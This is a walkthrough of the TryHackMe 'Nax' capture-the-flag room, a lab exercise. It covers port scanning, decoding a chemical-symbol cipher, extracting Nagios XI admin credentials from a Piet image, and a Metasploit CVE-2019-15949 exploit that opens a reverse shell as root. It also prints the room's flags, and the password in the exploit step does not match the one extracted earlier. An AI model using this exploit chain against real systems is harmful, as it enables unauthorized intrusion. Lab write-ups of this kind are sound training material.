# Walkthrough : TryHackMe - Nax CTF
## Part 1: Initial Reconnaissance, Web Enumeration & Hidden Endpoint Discovery
## Step 1: Network Connectivity & Service Enumeration
Establish the OpenVPN tunnel to the lab environment and execute a full TCP port scan against the target host (```10.48.168.45```) to identify running services and OS details.
- OpenVPN Connection:
```bash
sudo openvpn ap-south-1-varunkr578-regular.ovpn
```
- Nmap Port Scan Command:
```bash
nmap -sV -sC -p- 10.48.168.45
```
- Enumerated Open Ports & Services:
  - 22/tcp: OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux)
  - 25/tcp: Postfix smtpd
  - 80/tcp: Apache httpd 2.4.18 ((Ubuntu))
  - 389/tcp: OpenLDAP 2.2.x - 2.3.x
  - 443/tcp: Apache httpd 2.4.18 (Nagios XI SSL certificate: commonName=192.168.85.153/organizationName=Nagios Enterprises)
  - 5667/tcp: tcpwrapped

![](image1)
![](image2)

## Step 2: Web Directory Brute-Forcing
Perform a directory enumeration scan on port 80 to map hidden files and administrative paths.
- Gobuster Command:
```bash
gobuster dir -u http://10.48.168.45 -w /usr/share/wordlists/dirb/common.txt
```
- Discovered Routes:
  - ```/index.html``` (Status: 200)
  - ```/index.php``` (Status: 200 - Nagios XI landing page)
  - ```/nagios``` (Status: 401 - HTTP Basic Authentication required)
  - ```/javascript``` (Status: 301 - Redirect)

![](image3)
![](image4)

## Step 3: Web Inspection & Element Cipher Extraction
Analyzing the root page ```([http://10.48.168.45/](http://10.48.168.45/))``` reveals ASCII art along with a string of chemical element symbols displayed at the bottom:
```bash
Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
```
Cross-referencing these chemical symbols with the periodic table identifies their corresponding atomic numbers:
| Element Symbol	| Element Name	  | Atomic Number |
| :--             | :--             | :--           |
| Ag	            | Silver	        | 47            |
| Hg	            | Mercury	        | 80            |
| Ta	            | Tantalum	      | 73            |
| Sb	            | Antimony	      | 51            |
| Po	            | Polonium	      | 84            |
| Pd	            | Palladium	      | 46            |
| Hg	            | Mercury	        | 80            |
| Pt	            | Platinum	      | 78            |
| Lr	            | Lawrencium	    | 103           |

![](image5)
![](image6)

## Step 4: Decoding Atomic Numbers & Hidden Endpoint Retrieval
Convert the extracted atomic numbers from integer values into ASCII characters using a Python script (```convert.py```).
- Conversion Script (```convert.py```):
```bash
numbers = [47, 80, 73, 51, 84, 46, 80, 78, 103]
text = ''.join(chr(n) for n in numbers)
print(text)
```
- Execution & Output:
```bash
python3 convert.py
/PI3T.PNG
```
- Resource Retrieval: Navigating to ```[http://10.48.168.45/PI3T.PNG](http://10.48.168.45/PI3T.PNG)``` loads a high-resolution PNG image containing distinct pixel borders, indicating steganographic or pixel-encoded data for the next phase.

![](image7)
![](image8)
![](image9)

---

## Part 2: Steganography Analysis, Piet Execution & Credential Extraction
## Step 5: Image Metadata & Esoteric Language Identification
After downloading ```PI3T.PNG``` from the web root, ```exiftool``` was used to inspect the file's metadata for hidden clues or stegano-related fields.
- File Retrieval:
```bash
wget http://10.48.168.45/PI3T.PNG
```
- ExifTool Analysis:
```bash
exiftool PI3T.PNG
```
- Metadata Insights:
  - File Name: ```PI3T.PNG```
  - Image Size: 990 x 990 pixels
  - Artist Tag: ```Piet Mondrian```

The metadata field ```Artist: Piet Mondrian``` directly points to the Piet programming language—an esoteric, stack-based programming language where programs are constructed using abstract color artwork resembling Piet Mondrian's paintings.

![](image10)

## Step 6: Environment Setup & Image Format Conversion
To execute Piet programs, the interpreter ```npiet``` prefers the Netpbm Portable Pixel Map (```.ppm```) format or a clean PNG format. Python's Pillow library and ImageMagick were configured on the analyst machine to convert ```PI3T.PNG``` into ```PI3T.ppm```.
- Dependency Installation & Verification:
```bash
sudo apt update && sudo apt install imagemagick -y
python3 -c "from PIL import Image; print('Pillow OK')"
```
- Format Conversion Script:
```bash
python3 -c "from PIL import Image; Image.open('PI3T.PNG').convert('RGB').save('PI3T.ppm')"
file PI3T.ppm
```
- Output Verification:
```PI3T.ppm: Netpbm image data, size = 990 x 990, rawbits, pixmap```
 ![](image11)

## Step 7: Compiling the npiet Piet Interpreter
The ```npiet``` interpreter source code was downloaded from its official repository, unpacked, configured, and built to evaluate the Piet code embedded inside ```PI3T.ppm```.
- Downloading & Extracting ```npiet```:
```bash
wget "https://www.bertnase.de/npiet/npiet-1.3f.tar.gz"
tar zvfx npiet-1.3f.tar.gz
cd npiet-1.3f
```
- Building from Source:
```bash
./configure
make
```
![](image12)

## Step 8: Piet Program Execution & Credential Decoding
Running the compiled ```npiet``` binary against ```PI3T.ppm``` executes the underlying graphical instructions embedded in the image pixel grid.
- Initial Execution Attempt:
```bash
./npiet-1.3f/npiet PI3T.ppm
```
Output Stream:
```bash
nagiosadmin%n3p3UQ&9BjLp4$7uhWDnagiosadmin%n3p3UQ&9BjLp4$7uhWD...
```
- Extracted Credentials:
  - Username: ```nagiosadmin```
  - Password: ```n3p3UQ&9BjLp4$7uhWD```

These credentials provide administrative access to the Nagios XI web interface running on the target machine.

---

## Part 3: Vulnerability Exploitation, Privilege Escalation & Flag Retrieval
## Step 9: Vulnerability Research & Exploit Selection
With the ```nagiosadmin``` credentials successfully extracted from the Piet steganography challenge, the focus shifts to leveraging this administrative access against the Nagios XI web interface.
- Vulnerability Identification:
A search on Exploit-DB for Nagios XI reveals an Authenticated Remote Code Execution (RCE) vulnerability associated with version 5.6.6 (CVE-2019-15949). This exploit allows an authenticated administrator to execute arbitrary commands on the underlying system.
- Metasploit Initialization:
```bash
msfconsole
search cve:2019-15949
```
- Module Selection:
The search confirms the availability of a specific module for this vulnerability: ```exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce```.

![](image13)
![](image14)

## Step 10: Weaponization & System Compromise
The selected Metasploit module is configured using the previously obtained credentials and the target's IP address. This module works by uploading a malicious monitoring plugin (acting as a command stager) and executing it to establish a reverse TCP shell.
- Exploit Configuration:
```bash
use exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
set RHOSTS 10.48.168.45
set LHOST 192.168.135.130
set PASSWORD n3p3UQ&9BjLp4$7uhWdY
```
- Execution & Verification:
Executing the ```run``` command successfully authenticates to Nagios XI, uploads the malicious ```check_ping plugin```, and opens a Meterpreter session.
```bash
meterpreter > getuid
Server username: root
```
The exploit successfully grants direct ```root``` access, bypassing the need for a secondary local privilege escalation phase.

![](image15)
![](image16)

## Step 11: Post-Exploitation & Flag Retrieval
With full administrative control over the target machine, the final step is to locate and extract the required Capture The Flag (CTF) proof files.
- Root Flag Retrieval:
```bash
meterpreter > cd /root
meterpreter > cat root.txt
THM{c89b2e39c83067503a6508b21ed6e962}
```
- User Flag Retrieval:
```bash
meterpreter > cd /home/galand
meterpreter > cat user.txt
THM{84b17add1d72a9f2e99c33bc568ae0f1}
```
![](image17)
![](image18)
